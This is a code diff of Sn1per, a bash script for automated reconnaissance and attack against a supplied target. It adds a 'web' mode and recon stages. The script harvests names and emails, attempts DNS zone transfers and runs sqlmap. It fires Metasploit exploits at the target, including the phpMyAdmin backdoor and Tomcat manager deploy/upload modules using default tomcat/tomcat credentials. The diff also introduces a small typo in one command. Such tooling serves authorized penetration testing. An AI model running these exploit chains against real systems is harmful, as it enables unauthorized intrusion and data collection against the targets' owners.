@@ -20,14 +20,16 @@
 #
 # USAGE:
 # ./sniper <target>
+# ./sniper <target> <report>
 # ./sniper <target> stealth <report>
 # ./sniper <target> port <portnum>
+# ./sniper <target> web
 # ./sniper <target> nobrute <report>
 # ./sniper <targets.txt> airstrike <report>
 # ./sniper <targets.txt> nuke <report>
 #
 # UNCOMMENT AND SET TARGET DIR FOR UNIVERSAL ACCESS (ie. sniper <target>)
-# cd /pentest/web/Sn1per/ 
+#cd /pentest/web/Sn1per/ 
 
 TARGET="$1"
 MODE="$2"
@@ -47,6 +49,8 @@ OKRED='\033[91m'
 OKGREEN='\033[92m'
 OKORANGE='\033[93m'
 RESET='\e[0m'
+REGEX='^[0-9]+$'
+DIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
 
 if [ -z $TARGET ]; then
 	echo -e "$OKRED                ____               $RESET"
@@ -62,8 +66,17 @@ if [ -z $TARGET ]; then
 	exit
 fi
 
+if [[ ${TARGET:0:1} =~ $REGEX ]]; 
+	then 
+	SCAN_TYPE="IP"
+else 
+	SCAN_TYPE="DOMAIN"
+fi
+
+clear
+
 if [ "$MODE" = "report" ]; then
-	./sniper $TARGET $MODE | tee ./loot/sniper-$TARGET-`date +%Y%m%d%H%M`.txt 2>&1
+	./sniper $TARGET | tee ./loot/sniper-$TARGET-`date +%Y%m%d%H%M`.txt 2>&1
 	exit
 fi
 
@@ -112,6 +125,25 @@ if [ "$MODE" = "stealth" ]; then
 	echo -e "$RESET"
 	echo -e "$OKGREEN + -- --=[Launching stealth scan: $TARGET $RESET"
 	echo -e "$OKGREEN $RESET"
+	echo -e "$OKGREEN################################### Running recon #################################$RESET"
+	nslookup $TARGET
+	host $TARGET
+	if [ $SCAN_TYPE == "DOMAIN" ];
+	then
+		dig -x $TARGET
+		whois $TARGET
+		theharvester -d $TARGET -b google 2> /dev/null 
+		theharvester -d $TARGET -b bing 2> /dev/null
+		theharvester -d $TARGET -b linkedin 2> /dev/null
+		theharvester -d $TARGET -b people123 2> /dev/null
+		dnsrecon -d $TARGET
+		dnsrecon -d $TARGET -t zonewalk
+		dnsrecon -d $TARGET -t axfr
+		dnsenum $TARGET -f BruteX/wordlists/namelist.txt
+		mv -f *_ips.txt loot/ 2>/dev/null
+	fi
+	echo ""
+	echo -e "$OKGREEN################################### Running passive scans #########################$RESET"
 	unicornscan $TARGET 2> /dev/null
 	wafw00f http://$TARGET
 	whatweb http://$TARGET
@@ -161,6 +193,25 @@ if [ "$MODE" = "airstrike" ]; then
 	for a in `cat $TARGET`;
 	do 
 		echo -e "$OKGREEN + -- --=[Launching airstrike: $a $RESET"
+		echo -e "$OKGREEN################################### Running recon #################################$RESET"
+		nslookup $a
+		host $a
+		if [ $SCAN_TYPE == "DOMAIN" ];
+		then
+			dig -x $a
+			whois $a
+			theharvester -d $a -b google 2> /dev/null 
+			theharvester -d $a-b bing 2> /dev/null
+			theharvester -d $a -b linkedin 2> /dev/null
+			theharvester -d $a -b people123 2> /dev/null
+			dnsrecon -d $a
+			dnsrecon -d $a -t zonewalk
+			dnsrecon -d $a -t axfr
+			dnsenum $a -f BruteX/wordlists/namelist.txt
+			mv -f *_ips.txt loot/ 2>/dev/null
+		fi
+		echo ""
+		echo -e "$OKGREEN################################### Running passive scans #########################$RESET"
 		unicornscan $a 2> /dev/null
 		wafw00f http://$a
 		whatweb http://$a
@@ -212,18 +263,6 @@ if [ "$MODE" = "nuke" ]; then
 	done
 fi
 
-REGEX='^[0-9]+$'
-if [[ ${TARGET:0:1} =~ $REGEX ]]; 
-	then 
-	SCAN_TYPE="IP"
-else 
-	SCAN_TYPE="DOMAIN"
-fi
-
-DIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
-
-clear
-
 echo -e "$OKRED                ____               $RESET"
 echo -e "$OKRED    _________  /  _/___  ___  _____$RESET"
 echo -e "$OKRED   / ___/ __ \ / // __ \/ _ \/ ___/$RESET"
@@ -247,7 +286,7 @@ then
 	theharvester -d $TARGET -b people123 2> /dev/null
 	dnsrecon -d $TARGET
 	dnsrecon -d $TARGET -t zonewalk
-	dnsrecon -d quora.com -t axfr
+	dnsrecon -d $TARGET -t axfr
 	dnsenum $TARGET -f BruteX/wordlists/namelist.txt
 	mv -f *_ips.txt loot/ 2>/dev/null
 fi
@@ -430,12 +469,18 @@ else
 	echo -e "$RESET"
 
 	nikto -h http://$TARGET 
-	dirb http://$TARGET
-	wpscan --url http://$TARGET --batch
-	python $CMSMAP -t http://$TARGET
-	arachni http://$TARGET --output-only-positives
-	sqlmap -u "http://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
-	msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
+	
+	if [ "$MODE" = "web" ]
+	then
+		dirb http://$TARGET
+		wpscan --url http://$TARGET --batch
+		wpscan --url http://$TARGET/wordpress/ --batch
+		python $CMSMAP -t http://$TARGET
+		python $CMSMAP -t http://$TARGET/wordpress/
+		arachni http://$TARGET --output-only-positives
+		sqlmap -u "http://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
+		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
+	fi
 fi
 
 if [ -z "$port_110" ]
@@ -565,12 +610,18 @@ else
 	echo ""
 	echo -e "$RESET"
 	nikto -h https://$TARGET 
-	dirb http://$TARGET
-	wpscan --url https://$TARGET --batch
-	python $CMSMAP -t https://$TARGET
-	arachni https://$TARGET --output-only-positives
-	sqlmap -u "https://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
-	msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 443; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
+	
+	if [ "$MODE" = "web" ]
+	then
+		dirb https://$TARGET
+		wpscan --url https://$TARGET --batch
+		wpscan --url https://$TARGET/wordpress/ --batch
+		python $CMSMAP -t https://$TARGET
+		python $CMSMAP -t https://$TARGET/wordpress/
+		arachni https://$TARGET --output-only-positives
+		sqlmap -u "https://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
+		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 443; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
+	fi
 fi
 
 if [ -z "$port_445" ]
@@ -719,7 +770,7 @@ else
 	./massbleed $TARGET port 8000
 	cd ..
 	nikto -h http://$TARGET:8000 
-	arachni http://$TARGET:8000 --output-only-positives
+	#arachni http://$TARGET:8000 --output-only-positives
 fi
 
 if [ -z "$port_8100" ]
@@ -737,7 +788,7 @@ else
 	./massbleed $TARGET port 8100
 	cd ..
 	nikto -h http://$TARGET:8100 
-	arachni http://$TARGET:8100 --output-only-positives
+	#arachni http://$TARGET:8100 --output-only-positives
 fi
 
 if [ -z "$port_8080" ]
@@ -756,7 +807,7 @@ else
 	cd ..
 	nikto -h http://$TARGET:8080 
 	nmap -p 8080 --script=*proxy* $TARGET
-	arachni http://$TARGET:8080 --output-only-positives
+	#arachni http://$TARGET:8080 --output-only-positives
 	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
 fi
 
@@ -776,7 +827,7 @@ else
 	cd ..
 	nikto -h http://$TARGET:8180 
 	nmap -p 8180 --script=*proxy* $TARGET
-	arachni http://$TARGET:8180 --output-only-positives
+	#arachni http://$TARGET:8180 --output-only-positives
 	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8180; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
 fi
 
@@ -796,7 +847,7 @@ else
 	cd ..
 	nikto -h https://$TARGET:8443 
 	nmap -p 8443 --script=*proxy* $TARGET
-	arachni https://$TARGET:8443 --output-only-positives
+	#arachni https://$TARGET:8443 --output-only-positives
 fi
 
 if [ -z "$port_10000" ]
@@ -814,9 +865,6 @@ else
 	echo -e "$OKGREEN+ -- --=[Port 49152 opened... running tests...$RESET"
 	$SUPER_MICRO_SCAN $TARGET
 fi
-
-echo -e "$OKGREEN################################### Launching 3rd Party Modules ########################$RESET"
-python serializekiller/serializekiller.py --url $TARGET
 
 if [ "$MODE" = "nobrute" ]; then
 	echo -e "$OKGREEN################################### Skipping Brute Force ############################$RESET"
